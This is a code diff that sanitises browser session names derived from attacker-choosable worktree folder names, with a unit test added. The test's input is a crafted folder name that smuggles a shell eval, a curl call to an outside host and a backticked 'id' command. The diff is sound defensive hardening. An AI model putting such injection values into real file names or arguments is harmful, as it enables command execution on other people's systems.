@@ -9328,9 +9328,21 @@ fn stable_browser_session_name(cwd: &str) -> String {
     let mut hasher = DefaultHasher::new();
     cwd.hash(&mut hasher);
     let hash = hasher.finish();
-    // Truncate on a UTF-8 char boundary so multi-byte branch names stay
-    // valid; the hash below still disambiguates shared prefixes.
-    let short_name: String = dir_name.chars().take(MAX_DIR_NAME).collect();
+    // The basename is a branch or folder name a pull-request author can
+    // choose, and the session name ends up in agent-browser argv and file
+    // names. Keep only `[A-Za-z0-9._-]`; the hash over the full cwd still
+    // keeps names that map to the same text apart.
+    let short_name: String = dir_name
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
+                c
+            } else {
+                '-'
+            }
+        })
+        .take(MAX_DIR_NAME)
+        .collect();
     format!("ws-{}-{:06x}", short_name, hash & 0xFFFFFF)
 }
 
@@ -11302,6 +11314,22 @@ mod tests {
         );
 
         assert!(name.starts_with("ws-"), "expected ws- prefix, got: {name}");
+    }
+
+    #[test]
+    fn stable_browser_session_name_keeps_only_safe_characters() {
+        // A fork PR's head branch becomes the worktree folder name.
+        let name = stable_browser_session_name(
+            "/home/u/.codemux/worktrees/repo/x;eval${IFS}$(curl${IFS}e.vu)`id`",
+        );
+        assert!(name.starts_with("ws-x-eval--IFS"), "{name}");
+        assert!(
+            name.bytes()
+                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-')),
+            "unsafe character in session name: {name}"
+        );
+        // Plain branch names keep their existing session (and cookies).
+        assert!(stable_browser_session_name("/w/repo/main").starts_with("ws-main-"));
     }
 
     #[test]
